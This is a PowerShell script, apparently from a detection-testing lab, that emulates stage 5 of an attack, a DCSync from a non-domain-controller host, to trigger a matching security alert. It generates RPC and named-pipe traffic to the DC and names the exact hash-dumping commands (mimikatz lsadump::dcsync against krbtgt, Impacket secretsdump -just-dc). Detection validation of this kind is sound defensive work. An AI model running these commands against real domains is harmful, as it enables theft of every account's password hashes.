<#
    Stage 5 - Credential Access : DCSync from a non domain controller
    =================================================================
    The attacker abuses directory replication (MS-DRSR / DRSUAPI) from a host
    that is NOT a domain controller to pull password hashes - "DCSync". Seeing
    replication requests from a non-DC is the tell.

      EAL alert : 'Possible DCSync from a non domain controller' (rule b00baad9)
      ATT&CK    : Credential Access (TA0006) /
                  OS Credential Dumping: DCSync (T1003.006)

    NOTE: the actual DCSync needs the DRSUAPI GetNCChanges call (mimikatz
    lsadump::dcsync, or Impacket secretsdump -just-dc). Native PowerShell opens
    the DRSUAPI/replication RPC path to the DC, generating the traffic; drop the
    helper in scripts\tools\ for the real hash pull.
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

$dc = $cfg.DomainController
Write-Stage "STAGE 5 (Credential Access): DCSync/replication RPC to DC $dc (from non-DC)" "INFO"

# Touch the replication / directory RPC surface on the DC (endpoint mapper +
# the drsuapi/lsarpc pipes DCSync rides). This generates the DRSR-path traffic.
if ($cfg.DryRun) {
    Write-Host "  DRY: RPC/135 + \\$dc\pipe\lsass / drsuapi replication bind"
} else {
    try { Test-NetConnection -ComputerName $dc -Port 135 -InformationLevel Quiet -WarningAction SilentlyContinue | Out-Null } catch {}
    foreach ($p in @("pipe\lsarpc", "pipe\samr", "pipe\netlogon")) {
        try { & net use "\\$dc\$p" 2>$null | Out-Null; & net use "\\$dc\$p" /delete /y 2>$null | Out-Null } catch {}
    }
    Write-Stage "  Replication/directory RPC path exercised toward $dc" "OK"
}
$helper = Join-Path $PSScriptRoot "tools\mimikatz.exe"
if (Test-Path $helper) { Write-Stage "  mimikatz found - exact DCSync: lsadump::dcsync /domain:$($cfg.Domain) /user:krbtgt" "INFO" }
else { Write-Stage "  (For the exact DCSync, use mimikatz lsadump::dcsync or Impacket secretsdump -just-dc)" "INFO" }
Write-Stage "STAGE 5 done. Expect EAL: 'Possible DCSync from a non domain controller' (rule b00baad9)." "OK"
